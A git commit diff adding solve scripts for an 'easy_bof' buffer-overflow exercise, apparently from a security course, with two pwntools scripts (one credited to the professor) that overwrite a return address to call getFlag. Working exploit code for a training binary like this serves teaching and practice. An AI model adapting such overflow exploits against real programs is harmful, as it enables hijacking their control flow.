3a19f9280eceba6dee9da69d3e4bb1dcb4b01124
Dakkarm <73526965+Dakkarm@users.noreply.github.com>
2024-12-20 15:38:02 +0100

    Last commit

--- 2 parte/easy_bof/solve.py
+++ 2 parte/easy_bof/solve.py
@@ -1,3 +1,5 @@
+#da mega
+
 import pwn
 
 p = pwn.process("./easy_bof")
@@ -5,3 +7,22 @@ elf = pwn.ELF("./easy_bof")
 
 p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
 p.interactive()
+
+
+
+#fatto dal prof stamattina
+
+#!/usr/bin/env python3
+
+from pwn import *
+
+addr_getflag = p64(0x401196)
+
+with process('./easy_bof') as p:
+    print(p.recv().decode())
+
+    payload = b'A'*40 + addr_getflag
+
+    p.sendline(payload)
+
+    print(p.recv().decode())
